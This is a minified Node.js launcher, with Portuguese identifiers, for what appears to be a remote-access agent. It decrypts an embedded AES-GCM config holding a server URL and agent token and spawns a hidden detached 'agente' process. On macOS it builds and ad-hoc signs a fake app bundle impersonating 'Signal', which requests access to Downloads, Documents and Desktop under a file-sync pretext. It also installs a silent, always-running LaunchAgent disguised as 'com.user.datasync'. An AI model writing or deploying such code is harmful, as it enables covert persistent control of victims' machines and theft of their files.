#!/usr/bin/env node
import { createRequire as __cr } from 'node:module'; const require = __cr(import.meta.url);
var E=Object.defineProperty;var w=(e,t,r)=>()=>{if(r)throw r[0];try{return e&&(t=e(e=0)),t}catch(o){throw r=[o],o}};var j=(e,t)=>{for(var r in t)E(e,r,{get:t[r],enumerable:!0})};var k={};j(k,{CHAVE:()=>z,DADOS:()=>J,IV:()=>R,TAG:()=>U});var R,U,J,q,V,z,v=w(()=>{R="Dm+4hx9kYkGpLwq8",U="qHy1hL0D8J8RQ60Zc7DWqw==",J="Nb8qG1KUSYbJTlN42gd0b9zl4ljrv5s0H6rRDWkAJ/H4Uv6ZtZteTMLiJhU8xzo4Szfrol6uEsZWxT78Zti5oAWGFOrSu+b6eH6O4SBVa03PGPMKxDFolvhc0T7U6DIUMIBpEfeHF7GR6CA1BodGYGvsOqflpqfl1O+rz3F+Y4Q1E12DStw/AJyXDnoFPIaQq7RldDReGF5nWyHJDw==",q="85Vj1hFVNuAzdyXV",V="8XedtGSD3Jy5iIoI8Tuc5Dj8cdc=",z=q+V});import{spawn as oe}from"node:child_process";import{mkdirSync as C,readFileSync as L,writeFileSync as ne,rmSync as ie}from"node:fs";import{homedir as se}from"node:os";import a from"node:path";import{fileURLToPath as ae}from"node:url";import{createCipheriv as me,createDecipheriv as $,randomBytes as de}from"node:crypto";var G="aes-256-gcm";function h({iv:e,tag:t,dados:r,chave:o}){let i=$(G,Buffer.from(o,"base64"),Buffer.from(e,"base64"));i.setAuthTag(Buffer.from(t,"base64"));let c=Buffer.concat([i.update(Buffer.from(r,"base64")),i.final()]);return JSON.parse(c.toString("utf8"))}function D(e){return typeof e?.url!="string"||typeof e?.token!="string"?null:{url:e.url,token:e.token,persistir:e.persistir===!0}}async function A(){let e=process.env.URL_SERVIDOR?.trim(),t=process.env.TOKEN_AGENTE?.trim();if(e&&t)return{url:e,token:t,persistir:process.env.PERSISTIR==="true"};let r;try{r=await Promise.resolve().then(()=>(v(),k))}catch{return null}if(typeof r.CONFIG_B64=="string"&&r.CONFIG_B64)try{return D(JSON.parse(Buffer.from(r.CONFIG_B64,"base64").toString("utf8")))}catch{return null}if(typeof r.DADOS=="string"&&r.DADOS)try{return D(h({iv:r.IV,tag:r.TAG,dados:r.DADOS,chave:r.CHAVE}))}catch{return null}return null}import{execSync as x}from"node:child_process";import{mkdirSync as H,writeFileSync as M,rmSync as ke}from"node:fs";import P from"node:os";import m from"node:path";var d="com.user.datasync",T=m.join(P.homedir(),"Library","LaunchAgents"),O=m.join(T,`${d}.plist`),Ae=m.join(P.homedir(),".cache","acesso-shell"),_=()=>process.platform==="darwin",b=()=>`gui/${process.getuid()}`;function Y(e){return String(e).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function Z({nodeBin:e,agentePath:t,appPath:r}){let o=r?[r]:[e,t];return['<?xml version="1.0" encoding="UTF-8"?>','<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">','<plist version="1.0">',"<dict>","  <key>Label</key>",`  <string>${d}</string>`,"  <key>ProgramArguments</key>","  <array>",...o.map(i=>`    <string>${Y(i)}</string>`),"  </array>","  <key>RunAtLoad</key>","  <true/>","  <key>KeepAlive</key>","  <true/>","  <key>StandardOutPath</key>","  <string>/dev/null</string>","  <key>StandardErrorPath</key>","  <string>/dev/null</string>","</dict>","</plist>",""].join(`
`)}function F({nodeBin:e,agentePath:t,appPath:r}){if(!_())return!1;H(T,{recursive:!0}),M(O,Z({nodeBin:e,agentePath:t,appPath:r}),{mode:384});try{x(`launchctl bootout ${b()}/${d}`,{stdio:"ignore"})}catch{}return x(`launchctl bootstrap ${b()} ${JSON.stringify(O)}`,{stdio:"ignore"}),!0}import{spawnSync as f}from"node:child_process";import{chmodSync as K,mkdirSync as W,rmSync as X,writeFileSync as N}from"node:fs";import n from"node:path";import{fileURLToPath as Q,pathToFileURL as ee}from"node:url";var g=n.resolve(n.dirname(Q(import.meta.url)),".."),s="Signal",re="com.user.datasync.launcher",te=`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleIdentifier</key>
  <string>${re}</string>
  <key>CFBundleName</key>
  <string>${s}</string>
  <key>CFBundleDisplayName</key>
  <string>${s}</string>
  <key>CFBundleExecutable</key>
  <string>${s}</string>
  <key>CFBundlePackageType</key>
  <string>APPL</string>
  <key>CFBundleShortVersionString</key>
  <string>1.0.0</string>
  <key>CFBundleVersion</key>
  <string>1</string>
  <key>LSMinimumSystemVersion</key>
  <string>12.0</string>
  <key>LSUIElement</key>
  <false/>
  <key>NSDownloadsFolderUsageDescription</key>
  <string>O Signal precisa acessar a pasta Downloads para manter seus arquivos sincronizados.</string>
  <key>NSDocumentsFolderUsageDescription</key>
  <string>O Signal precisa acessar a pasta Documentos para manter seus arquivos sincronizados.</string>
  <key>NSDesktopFolderUsageDescription</key>
  <string>O Signal precisa acessar a Area de Trabalho para manter seus arquivos sincronizados.</string>
  <key>NSAppleEventsUsageDescription</key>
  <string>O Signal usa o Finder para localizar e sincronizar seus arquivos.</string>
</dict>
</plist>
`;function y({destino:e,nodeBin:t=process.execPath,agentePath:r}){let o=n.join(n.resolve(e),`${s}.app`),i=n.join(o,"Contents"),c=n.join(i,"MacOS"),l=n.join(c,s);X(o,{recursive:!0,force:!0}),W(c,{recursive:!0}),N(l,`#!/bin/zsh
# gerado por scripts/empacotar-app.mjs
exec ${JSON.stringify(t)} ${JSON.stringify(r)}
`),K(l,493),N(n.join(i,"Info.plist"),te);let S=f("codesign",["--force","--sign","-","--timestamp=none",o],{stdio:"pipe"});f("/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister",["-f",o],{stdio:"ignore"});let B=S.status===0&&f("codesign",["--verify","--verbose=0",o]).status===0;return{bundle:o,executavel:l,assinado:B,erroAssinatura:S.stderr?.toString().trim()}}if(process.argv[1]&&import.meta.url===ee(n.resolve(process.argv[1])).href){let e=n.resolve(process.argv[2]??n.join(g,"dist")),t=y({destino:e,nodeBin:process.env.NODE??process.execPath,agentePath:n.join(g,"agente","index.mjs")});t.assinado?console.log("[ok] app assinado ad-hoc e verificado."):(console.warn("[aviso] codesign falhou; app ficou SEM assinatura (TCC vai pedir a cada rebuild):"),console.warn(`        ${t.erroAssinatura||"erro desconhecido"}`)),console.log(`
app gerado: ${t.bundle}`),console.log(`node embutido: ${process.env.NODE??process.execPath}`),console.log(`agente embutido: ${n.join(g,"agente","index.mjs")}`),console.log(`abrir com: open ${JSON.stringify(t.bundle)}`),console.log(`
Lembrete: regenerar o app invalida o grant de TCC (muda o hash da assinatura).`)}var I=a.dirname(ae(import.meta.url)),p=a.join(se(),".cache","acesso-shell"),u=a.join(p,"agente.pid");function ce(){try{let e=Number.parseInt(L(u,"utf8").trim(),10);return!Number.isFinite(e)||e<=0?!1:(process.kill(e,0),!0)}catch{return!1}}function pe(){try{let e=Number.parseInt(L(u,"utf8").trim(),10);Number.isFinite(e)&&e>0&&process.kill(e,"SIGKILL")}catch{}try{ie(u,{force:!0})}catch{}}try{let e=await A();if(e){if(e.persistir&&process.platform==="darwin"){let t=a.join(I,"agente","index.mjs"),r;try{C(p,{recursive:!0}),r=y({destino:p,nodeBin:process.execPath,agentePath:t}).executavel}catch{r=void 0}pe(),F({nodeBin:process.execPath,agentePath:t,appPath:r})}else if(!ce()){C(p,{recursive:!0});let t=oe(process.execPath,[a.join(I,"agente","index.mjs")],{detached:!0,stdio:"ignore"});t.unref(),t.pid&&ne(u,String(t.pid),{mode:384})}}}catch{}process.exit(0);
